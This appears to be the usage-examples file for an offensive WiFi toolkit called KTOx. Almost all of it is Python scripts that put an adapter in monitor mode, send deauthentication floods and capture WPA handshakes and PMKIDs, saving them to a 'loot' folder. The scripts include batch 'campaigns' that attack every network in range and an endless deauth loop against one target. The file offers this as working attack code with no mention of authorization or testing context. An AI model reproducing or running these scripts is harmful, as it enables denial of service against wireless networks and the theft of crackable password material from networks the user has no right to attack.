# WiFi Handshake Engine - Usage Examples

## Quick Start

### 1. Basic Handshake Capture
```python
#!/usr/bin/env python3
from payloads.wifi.wifi_handshake_engine import get_wifi_engine

engine = get_wifi_engine()

# Check Scapy availability
if not engine.is_scapy_available():
    print("ERROR: Install Scapy first!")
    exit(1)

# Enable monitor mode
if not engine.enable_monitor_mode("wlan1"):
    print("Failed to enable monitor mode")
    exit(1)

# Scan for networks
print("Scanning for networks...")
if not engine.scan_networks(timeout=10):
    print("No networks found")
    engine.disable_monitor_mode()
    exit(1)

# Get available networks
networks = engine.get_networks_list()
for i, (bssid, essid, channel, signal) in enumerate(networks):
    print(f"[{i}] {essid:30} ({bssid}) Ch{channel} Sig{signal}dBm")

# Select first network
bssid, essid, channel, signal = networks[0]
print(f"\nCapturing handshake for: {essid}")

# Capture handshake
if engine.capture_handshake(bssid, essid, channel):
    print(f"✓ Handshake saved!")
    print(f"  Location: /root/KTOx/loot/handshakes/")
else:
    print("✗ Handshake capture failed")

# Cleanup
engine.disable_monitor_mode()
print("Monitor mode disabled")
```

### 2. Deauth Attack
```python
#!/usr/bin/env python3
from payloads.wifi.wifi_handshake_engine import get_wifi_engine
import time

engine = get_wifi_engine()

# Setup
engine.enable_monitor_mode("wlan1")
engine.scan_networks(timeout=10)

networks = engine.get_networks_list()
bssid, essid, channel, _ = networks[0]

print(f"Deauthing: {essid}")

# Send 20 deauth frames at 5 packets/second
for i in range(3):
    engine.set_channel(channel)
    engine.deauth_network(bssid, count=20, pps=5)
    print(f"Wave {i+1} sent")
    time.sleep(2)

engine.disable_monitor_mode()
```

### 3. PMKID Capture
```python
#!/usr/bin/env python3
from payloads.wifi.wifi_handshake_engine import get_wifi_engine

engine = get_wifi_engine()

engine.enable_monitor_mode("wlan1")
engine.scan_networks(timeout=15)

networks = engine.get_networks_list()
for bssid, essid, channel, signal in networks:
    print(f"Trying PMKID on: {essid}")
    if engine.pmkid_attack(bssid, essid, channel, timeout=5):
        print(f"  ✓ PMKID captured")

engine.disable_monitor_mode()
```

### 4. Multi-Network Campaign
```python
#!/usr/bin/env python3
from payloads.wifi.wifi_handshake_engine import get_wifi_engine
import time

engine = get_wifi_engine()

# Setup
engine.enable_monitor_mode("wlan1")

# Campaign parameters
HANDSHAKE_TIMEOUT = 30
DEAUTH_COUNT = 8
PPS = 5

try:
    # Scan once
    print("Initial scan...")
    engine.scan_networks(timeout=20)
    networks = engine.get_networks_list()
    
    # Attack each network
    for bssid, essid, channel, signal in networks[:5]:  # First 5 networks
        if signal == "?":
            print(f"Skipping {essid} (weak signal)")
            continue
            
        print(f"\n{'='*50}")
        print(f"Target: {essid}")
        print(f"BSSID:  {bssid}")
        print(f"Channel: {channel}")
        print(f"Signal:  {signal}dBm")
        print(f"{'='*50}")
        
        # Set channel and capture
        engine.set_channel(channel)
        
        if engine.capture_handshake(bssid, essid, channel, 
                                    timeout=HANDSHAKE_TIMEOUT,
                                    deauth_count=DEAUTH_COUNT):
            print(f"✓ Handshake captured!")
        else:
            print(f"✗ Handshake failed - trying PMKID")
            if engine.pmkid_attack(bssid, essid, channel, timeout=10):
                print(f"✓ PMKID captured!")
            else:
                print(f"✗ Both methods failed")
        
        # Cooldown between targets
        time.sleep(3)

finally:
    print("\nCleaning up...")
    engine.disable_monitor_mode()
    print("Done!")
```

### 5. Continuous Monitoring
```python
#!/usr/bin/env python3
from payloads.wifi.wifi_handshake_engine import get_wifi_engine
import time

engine = get_wifi_engine()
engine.enable_monitor_mode("wlan1")

target_bssid = "AA:BB:CC:DD:EE:FF"
target_essid = "MyNetwork"
target_channel = 6

print(f"Monitoring: {target_essid}")
print("Press Ctrl+C to stop")

try:
    while True:
        # Continuously deauth target
        engine.set_channel(target_channel)
        
        print(f"[{time.strftime('%H:%M:%S')}] Sending deauth wave...")
        engine.deauth_network(target_bssid, count=16, pps=8)
        
        # Wait before next wave
        time.sleep(5)
        
except KeyboardInterrupt:
    print("\nStopping...")
    engine.disable_monitor_mode()
    print("Stopped!")
```

## Integration with KTOx Main Menu

### Within ktox_device.py
```python
# In your custom menu handler:
from payloads.wifi.wifi_handshake_engine import get_wifi_engine

def my_wifi_function():
    engine = get_wifi_engine()
    
    if not engine.is_scapy_available():
        Dialog_info("Scapy not installed", wait=True)
        return
    
    if not engine.enable_monitor_mode(ktox_state["wifi_iface"]):
        Dialog_info("Monitor mode failed", wait=True)
        return
    
    # ... rest of your code ...
    
    engine.disable_monitor_mode()
```

## Error Handling Examples

### Graceful Failure
```python
from payloads.wifi.wifi_handshake_engine import get_wifi_engine

engine = get_wifi_engine()

try:
    if not engine.enable_monitor_mode("wlan0"):
        raise RuntimeError("Monitor mode failed")
    
    if not engine.scan_networks(timeout=10):
        raise RuntimeError("Network scan failed")
    
    networks = engine.get_networks_list()
    if not networks:
        raise RuntimeError("No networks found")
    
    bssid, essid, channel, _ = networks[0]
    
    if not engine.capture_handshake(bssid, essid, channel):
        raise RuntimeError("Handshake capture failed")
    
    print("✓ Operation succeeded")

except RuntimeError as e:
    print(f"✗ Error: {e}")

finally:
    engine.disable_monitor_mode()
```

### Retry Logic
```python
from payloads.wifi.wifi_handshake_engine import get_wifi_engine
import time

engine = get_wifi_engine()
engine.enable_monitor_mode("wlan1")

bssid = "AA:BB:CC:DD:EE:FF"
essid = "TestNetwork"
channel = 6

MAX_RETRIES = 3
retry_count = 0

while retry_count < MAX_RETRIES:
    try:
        if engine.capture_handshake(bssid, essid, channel, timeout=30):
            print("✓ Success!")
            break
    except Exception as e:
        print(f"Attempt {retry_count + 1} failed: {e}")
        retry_count += 1
        if retry_count < MAX_RETRIES:
            print(f"Retrying in 5 seconds...")
            time.sleep(5)
        else:
            print("All retries exhausted")

engine.disable_monitor_mode()
```

## Performance Optimization

### Parallel Scanning
```python
from payloads.wifi.wifi_handshake_engine import get_wifi_engine
import threading

def scan_thread():
    engine = get_wifi_engine()
    engine.enable_monitor_mode("wlan1")
    engine.scan_networks(timeout=20)
    networks = engine.get_networks_list()
    # Process results
    engine.disable_monitor_mode()

# Run in background
thread = threading.Thread(target=scan_thread, daemon=True)
thread.start()
# Do other work while scanning...
```

### Batch Handshake Capture
```python
from payloads.wifi.wifi_handshake_engine import get_wifi_engine
import time

engine = get_wifi_engine()
engine.enable_monitor_mode("wlan1")

# Get all networks
engine.scan_networks(timeout=15)
networks = engine.get_networks_list()

# Batch capture with progress
total = len(networks)
success = 0

for i, (bssid, essid, channel, signal) in enumerate(networks):
    print(f"[{i+1}/{total}] {essid}... ", end="", flush=True)
    
    engine.set_channel(channel)
    
    if engine.capture_handshake(bssid, essid, channel, timeout=20):
        print("✓")
        success += 1
    else:
        print("✗")
    
    time.sleep(1)  # Brief pause between captures

print(f"\nResults: {success}/{total} successful")
engine.disable_monitor_mode()
```

## Debugging Output

### Enable Verbose Logging
```python
import logging

# Set to DEBUG for detailed output
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

from payloads.wifi.wifi_handshake_engine import get_wifi_engine

engine = get_wifi_engine()
# All operations now produce verbose logs
```

### Manual EAPOL Checking
```python
#!/usr/bin/env python3
from scapy.all import rdpcap, EAPOL, Dot11

# Verify captured handshake
pcap_file = "/root/KTOx/loot/handshakes/hs_network.pcap"

packets = rdpcap(pcap_file)
eapol_frames = [pkt for pkt in packets if EAPOL in pkt]

print(f"Total packets: {len(packets)}")
print(f"EAPOL frames: {len(eapol_frames)}")

for i, pkt in enumerate(eapol_frames):
    if Dot11 in pkt:
        print(f"  Frame {i+1}: {pkt[Dot11].addr2} → {pkt[Dot11].addr3}")
```

## References

- Engine code: `/home/user/KTOX_Pi/payloads/wifi/wifi_handshake_engine.py`
- Main integration: `/home/user/KTOX_Pi/ktox_device.py`
- Full guide: `/home/user/KTOX_Pi/WIFI_ENGINE_GUIDE.md`
- Scapy docs: https://scapy.readthedocs.io/
- Aircrack-ng: https://www.aircrack-ng.org/
